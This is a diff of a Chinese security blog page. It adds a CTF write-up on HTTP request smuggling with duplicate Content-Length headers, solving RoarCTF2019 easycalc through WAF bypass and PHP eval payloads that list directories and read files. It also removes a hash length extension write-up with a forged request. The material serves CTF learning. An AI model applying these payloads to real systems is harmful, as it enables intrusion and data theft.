@@ -207,6 +207,149 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d6d78f7a68.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/d6d78f7a68.html" class="post-title-link" itemprop="url">HTTP走私漏洞-RoarCTF2019-easycalc</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-10-16 23:16:38" itemprop="dateCreated datePublished" datetime="2019-10-16T23:16:38+08:00">2019-10-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-14 17:18:31" itemprop="dateModified" datetime="2020-10-14T17:18:31+08:00">2020-10-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="HTTP走私漏洞"><a href="#HTTP走私漏洞" class="headerlink" title="HTTP走私漏洞"></a>HTTP走私漏洞</h2><h3 id="Cl-Cl"><a href="#Cl-Cl" class="headerlink" title="Cl-Cl"></a>Cl-Cl</h3><p>​        以一个http包为例，这个数据包中存在两个Cl，按照正常规则如果存在两个Cl并且两个Cl的值不等时候，服务器会返回400错误，但是总有服务器不会严格执行规范，中间服务器在接受到这个请求后会按照第一个<code>Content-Length</code>对请求进行处理，但是这个请求包发到后端服务器就会按照第二个<code>Content-length</code>进行处理，这要就导致了一个问题，第二个<code>Content-Length</code>长度比第一个<code>Content-length</code>少一位，这要在第二次处理这个数据包的时候<code>a</code>就会没有被读取到从而留在了缓冲区，但是我们知道HTTP和普通的TCP不一样，存在一个 <code>Keep-Alive</code> 会导致TCP重用，那么下一个请求包就会把a拼接进去导致错误。（参考资料：<a href="https://paper.seebug.org/1048/）" target="_blank" rel="noopener">https://paper.seebug.org/1048/）</a></p>
+<p>构造的恶意请求包：</p>
+<pre><code class="http">POST / HTTP/1.1\r\n
+Host: example.com\r\n
+Content-Length: 8\r\n
+Content-Length: 7\r\n
+
+12345\r\n
+a</code></pre>
+<p>第二次被拼接的请求包：</p>
+<pre><code class="http">aPOST / HTTP/1.1\r\n
+Host: example.com\r\n
+Content-Length: 8\r\n
+Content-Length: 7\r\n
+
+12345\r\n
+a</code></pre>
+<p>​        那么如果服务器严格遵循规范呢？存在两个Cl就直接400岂不是没法用了？这里又引申了一个问题，这样如果第一个前端服务器是nginx用于转发docker的流量而这个前端服务器存在一个waf，那么就可能导致这个waf失效，完整转发我们恶意代码，RoarCTF的easy-calc就是这样的问题。</p>
+<h3 id="RoarCTF2019-easycalc"><a href="#RoarCTF2019-easycalc" class="headerlink" title="RoarCTF2019-easycalc"></a>RoarCTF2019-easycalc</h3><hr>
+<p>题目源码：</p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+if(!isset($_GET[&#39;num&#39;])){
+    show_source(__FILE__);
+}else{
+        $str = $_GET[&#39;num&#39;];
+        $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];
+        foreach ($blacklist as $blackitem) {
+                if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $str)) {
+                        die(&quot;what are you want to do?&quot;);
+                }
+        }
+        eval(&#39;echo &#39;.$str.&#39;;&#39;);
+}
+?&gt; </code></pre>
+<ul>
+<li><p>题目源码比较简单，绕过方式和国赛lovemath一样或者使用取反方式绕过</p>
+</li>
+<li><p>但是这里存在一个问题这个环境存在waf只能够使用这些字符：<code>%&amp;.,(*/-+)&lt;=&gt;?;:@\~}|{0123456789</code></p>
+</li>
+<li><p>这里就是上面说的方法，使用两个CL导致前端服务器400，但是完整转发了HTTP请求，从而导致执行waf被绕过导致执行恶意代码。</p>
+</li>
+<li><p>这里构造payload与lovemath一致，使用<code>base_convert(&quot;scandir&quot;,36,10);</code>也就是说将36进制转换为10进制，具体请参考国赛lovemath.然后将10进制转换为36进制那么就可以构造出来scandir，别人的write  up的payload是<code>base_convert(61693386291,10,36)(hex2bin(dechex(47)));</code>,dechex()将10进制转16进制，而hex2bin是将16进制转char，但是我不知为什么他们要这么搞，这里并没有过滤scandir,甚至构造‘/’根本用不上十进制转16进制再转char，而是直接可以用AIISC转char。而且很多队伍解法一样，目测py的很多。</p>
+</li>
+<li><p>最终payload： <code>base_convert(2146934604002,10,36(hex2bin(dechex(47)).base_convert(25254448,10,36))</code></p>
+</li>
+<li><p>我的payload：<code>var_dump(scandir(chr(47)));</code></p>
+</li>
+<li><p>最终payload：<code>var_dump(readfile(chr(47).base_convert(25254448,10,36)));</code></p>
+</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191017/15712450236096.png" alt="img"></p>
+<hr>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191017/1571245047649.png" alt="img"></p>
+<h3 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h3><p>​    PHP中会对传入的参数名去取空格或者替换为下划线字符。（<a href="https://www.freebuf.com/articles/web/213359.html）如本次比赛的num前面加个空格即可绕过waf" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/213359.html）如本次比赛的num前面加个空格即可绕过waf</a>.</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191019/15714458007264.png" alt="img"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d5c8fc5c96.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1895,182 +2038,6 @@ echo htmlspecialchars($result);
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/1559adf164.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/header.jpg">
-      <meta itemprop="name" content="XiaoLeung">
-      <meta itemprop="description" content="随笔、分享、记录生活">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xiao Leung's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/articles/1559adf164.html" class="post-title-link" itemprop="url">Hash长度扩展攻击学习笔记</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2019-09-12 17:33:48" itemprop="dateCreated datePublished" datetime="2019-09-12T17:33:48+08:00">2019-09-12</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-14 17:23:02" itemprop="dateModified" datetime="2020-10-14T17:23:02+08:00">2020-10-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>2.9k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>3 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p> <a href="http://ctf5.shiyanbar.com/web/kzhan.php" target="_blank" rel="noopener">实验吧：让我进去</a></p>
-<h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><pre><code class="php">$flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;
-$secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security!
-
-$username = $_POST[&quot;username&quot;];
-$password = $_POST[&quot;password&quot;];
-
-if (!empty($_COOKIE[&quot;getmein&quot;])) {
-    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) {
-        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {
-            echo &quot;Congratulations! You are a registered user.\n&quot;;
-            die (&quot;The flag is &quot;. $flag);
-        }
-        else {
-            die (&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;);
-        }
-    }
-    else {
-        die (&quot;You are not an admin! LEAVE.&quot;);
-    }
-}
-
-setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));
-
-if (empty($_COOKIE[&quot;source&quot;])) {
-    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));
-}
-else {
-    if ($_COOKIE[&quot;source&quot;] != 0) {
-        echo &quot;&quot;; // This source code is outputted here
-    }
-}
-
-$username = $_POST[&quot;username&quot;];
-$password = $_POST[&quot;password&quot;];
-
-if (!empty($_COOKIE[&quot;getmein&quot;])) {
-    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) {
-        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {
-            echo &quot;Congratulations! You are a registered user.\n&quot;;
-            die (&quot;The flag is &quot;. $flag);
-        }
-        else {
-            die (&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;);
-        }
-    }
-    else {
-        die (&quot;You are not an admin! LEAVE.&quot;);
-    }
-}
-
-setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));
-
-if (empty($_COOKIE[&quot;source&quot;])) {
-    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));
-}
-else {
-    if ($_COOKIE[&quot;source&quot;] != 0) {
-        echo &quot;&quot;; // This source code is outputted here
-    }
-}</code></pre>
-<h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><ul>
-<li><strong>HASHPUMP：</strong></li>
-</ul>
-<pre><code class="shell">root@kali:~# hashpump
-Input Signature: 571580b26c65f306376d4f64e53cb5c7
-Input Data: admin
-Input Key Length: 20
-Input Data to Add: admin
-e18dfd8404515016d3aeeea2aa196909
-admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00admin</code></pre>
-<ul>
-<li><strong>构造payload</strong></li>
-</ul>
-<pre><code>POST /web/kzhan.php HTTP/1.1
-Host: ctf5.shiyanbar.com
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 151
-Connection: close
-Referer: http://ctf5.shiyanbar.com/web/kzhan.php
-Cookie: sample-hash=571580b26c65f306376d4f64e53cb5c7; source=1;getmein=e18dfd8404515016d3aeeea2aa196909; Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1567956475; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*214456%2CnickName%3Agqleung
-Upgrade-Insecure-Requests: 1
-X-Forwarded-For: 127.0.0.1
-
-username=admin&amp;password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00admin</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190912/15682801246486.png" alt="img"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2142,7 +2109,7 @@ username=admin&amp;password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%0
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">75</span>
+          <span class="site-state-item-count">76</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -2213,7 +2180,7 @@ username=admin&amp;password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%0
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">282k</span>
+    <span title="站点总字数">283k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
